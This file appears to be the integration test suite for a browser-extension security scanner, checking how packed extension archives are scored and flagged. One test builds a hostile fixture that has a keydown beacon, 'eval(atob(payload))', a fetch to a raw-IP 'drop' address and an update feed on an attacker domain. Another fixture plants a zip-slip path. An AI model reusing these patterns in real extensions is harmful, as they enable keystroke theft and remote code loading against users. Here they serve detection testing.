// The full pipeline: openArchive + scanPackage over packed fixtures.
// These are the integration tests for the library API — archive hygiene,
// identity cross-checks, rubric aggregation, endpoint collection.
import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";

import { openArchive, scanPackage } from "../dist/scan.js";
import {
  buildExtensionZip,
  buildZip,
  wrapCrx3,
  makeManifest,
  CRX_ID_STRING,
  FAKE_KEY,
} from "./helpers.mjs";

function scanZip(files, source = "fixture.zip") {
  return scanPackage(openArchive(buildExtensionZip(files), source));
}

function ruleSet(result) {
  return new Set(result.findings.map((f) => f.rule));
}

test("a clean, minimal MV3 extension scores 0 / minimal with zero findings", () => {
  const result = scanZip({
    "manifest.json": makeManifest({ permissions: ["storage"] }),
    "background.js": 'chrome.storage.local.set({ ready: true });\n',
    "popup.html": '<html><body><script src="popup.js"></script></body></html>',
    "popup.js": 'document.title = "ok";\n',
  });
  assert.deepEqual(result.findings, []);
  assert.equal(result.risk.score, 0);
  assert.equal(result.risk.level, "minimal");
  assert.equal(result.package.fileCount, 4);
});

test("a hostile extension trips rules across every axis and grades critical", () => {
  const result = scanZip({
    "manifest.json": makeManifest({
      manifest_version: 2,
      permissions: ["cookies", "webRequest", "webRequestBlocking", "<all_urls>"],
      content_scripts: [{ matches: ["<all_urls>"], js: ["cs.js"] }],
      update_url: "https://updates.example-attacker.net/feed.xml",
      content_security_policy: "script-src 'self' https://cdn.example-attacker.net",
    }),
    "cs.js": 'document.addEventListener("keydown", k => beacon(k));\n',
    "bg.js":
      'eval(atob(payload));\nfetch("https://www.google-analytics.com/collect");\nfetch("http://198.51.100.7/drop");\n',
  });
  const rules = ruleSet(result);
  for (const expected of [
    "PERM_COMBO_INTERCEPT",
    "PERM_COMBO_COOKIES",
    "PERM_CONTENT_SCRIPT_ALL",
    "ID_SELF_HOSTED_UPDATE",
    "CSP_REMOTE_SCRIPT_SRC",
    "RCL_EVAL",
    "PRIV_KEY_LISTENER",
    "NET_TRACKER",
    "NET_RAW_IP",
  ]) {
    assert.ok(rules.has(expected), `missing ${expected}`);
  }
  assert.equal(result.risk.level, "critical");
  assert.ok(result.risk.score >= 70);
  // Findings arrive pre-sorted: severities never increase down the list.
  const ranks = result.findings.map((f) =>
    ["info", "low", "medium", "high", "critical"].indexOf(f.severity),
  );
  for (let i = 1; i < ranks.length; i++) {
    assert.ok(ranks[i] <= ranks[i - 1], "findings must be sorted worst-first");
  }
});

test("CRX identity flows into the result: id, proofs, sha256, format", () => {
  const crx = wrapCrx3(buildExtensionZip({ "manifest.json": makeManifest() }));
  const result = scanPackage(openArchive(crx, "sample.crx"));
  assert.equal(result.package.format, "crx3");
  assert.equal(result.identity.crxId, CRX_ID_STRING);
  assert.deepEqual(result.identity.proofs, { rsa: 1, ecdsa: 0 });
  assert.equal(result.package.sha256, createHash("sha256").update(crx).digest("hex"));
  assert.equal(result.package.bytes, crx.length);
});

test("manifest key vs container id: mismatch is flagged, match is not", () => {
  const keyB64 = Buffer.from(FAKE_KEY).toString("base64");
  const zip = buildExtensionZip({ "manifest.json": makeManifest({ key: keyB64 }) });
  // Container claims CRX_ID_BYTES, which is not sha256(FAKE_KEY): mismatch.
  const mismatch = scanPackage(openArchive(wrapCrx3(zip), "spoof.crx"));
  const f = mismatch.findings.find((x) => x.rule === "ID_KEY_MISMATCH");
  assert.equal(f.severity, "high");
  assert.match(f.detail, new RegExp(CRX_ID_STRING));
  // Container id derived from the same key: consistent, no finding.
  const honestId = createHash("sha256").update(FAKE_KEY).digest().subarray(0, 16);
  const match = scanPackage(openArchive(wrapCrx3(zip, { idBytes: honestId }), "honest.crx"));
  assert.ok(!ruleSet(match).has("ID_KEY_MISMATCH"));
});

test("update_url: store hosts pass, anything else is self-hosted", () => {
  const store = scanZip({
    "manifest.json": makeManifest({
      update_url: "https://clients2.google.com/service/update2/crx",
    }),
  });
  assert.ok(!ruleSet(store).has("ID_SELF_HOSTED_UPDATE"));
  const selfHosted = scanZip({
    "manifest.json": makeManifest({ update_url: "https://cdn.example.net/updates.xml" }),
  });
  const f = selfHosted.findings.find((x) => x.rule === "ID_SELF_HOSTED_UPDATE");
  assert.equal(f.severity, "high");
});

test("a package without manifest.json is flagged but still scanned", () => {
  const result = scanZip({ "payload.js": "eval(x);\n" }, "mystery.zip");
  const rules = ruleSet(result);
  assert.ok(rules.has("ID_NO_MANIFEST"));
  assert.ok(rules.has("RCL_EVAL")); // code scanning proceeds regardless
});

test("archive hygiene: zip-slip paths, duplicates and CRC lies become findings", () => {
  const zip = buildZip([
    { path: "manifest.json", data: JSON.stringify(makeManifest()) },
    { path: "../escape.js", data: "x" },
    { path: "app.js", data: "let a = 1;" },
    { path: "app.js", data: "let a = 2;" },
    { path: "tampered.js", data: "let b = 3;", corruptCrc: true },
  ]);
  const result = scanPackage(openArchive(zip, "hostile.zip"));
  const rules = ruleSet(result);
  assert.ok(rules.has("FILE_UNSAFE_PATH"));
  assert.ok(rules.has("FILE_DUPLICATE_ENTRY"));
  assert.ok(rules.has("FILE_CRC_MISMATCH"));
});

test("native binaries and executable extensions inside the package are flagged", () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(64)]);
  const result = scanZip({
    "manifest.json": makeManifest(),
    "bin/helper": elf,
    "tools/setup.bat": "@echo off\n",
  });
  const natives = result.findings.filter((f) => f.rule === "FILE_NATIVE_BINARY");
  assert.equal(natives.length, 1);
  assert.equal(natives[0].severity, "critical");
  assert.equal(natives[0].file, "bin/helper");
  const ext = result.findings.find((f) => f.rule === "FILE_EXECUTABLE_EXT");
  assert.equal(ext.file, "tools/setup.bat");
});

test("XPI: .xpi naming and gecko id are reported; lenient manifest noted", () => {
  const manifestText = `{
    // Firefox build
    "manifest_version": 2,
    "name": "Notes",
    "version": "1.2.0",
    "browser_specific_settings": { "gecko": { "id": "notes@example.net" } }
  }`;
  const zip = buildZip([{ path: "manifest.json", data: manifestText }]);
  const result = scanPackage(openArchive(zip, "notes.xpi"));
  assert.equal(result.package.format, "xpi");
  assert.equal(result.identity.geckoId, "notes@example.net");
  assert.equal(result.identity.name, "Notes");
  const lenient = result.findings.find((f) => f.rule === "ID_LENIENT_MANIFEST");
  assert.equal(lenient.severity, "info");
  assert.equal(result.risk.level, "minimal"); // info-only findings score 0
});

test("endpoints aggregate across files with the manifest's URLs excluded from code findings", () => {
  const result = scanZip({
    "manifest.json": makeManifest({ homepage_url: "https://example.net/home" }),
    "a.js": 'fetch("https://api.example.net/v1");',
    "b.js": 'fetch("https://api.example.net/v1"); fetch("wss://live.example.net/x");',
  });
  const api = result.endpoints.find((e) => e.url === "https://api.example.net/v1");
  assert.deepEqual(api.files, ["a.js", "b.js"]);
  const kinds = new Set(result.endpoints.map((e) => e.kind));
  assert.ok(kinds.has("plain"));
  assert.deepEqual(result.findings, []); // wss + plain https: nothing to report
});
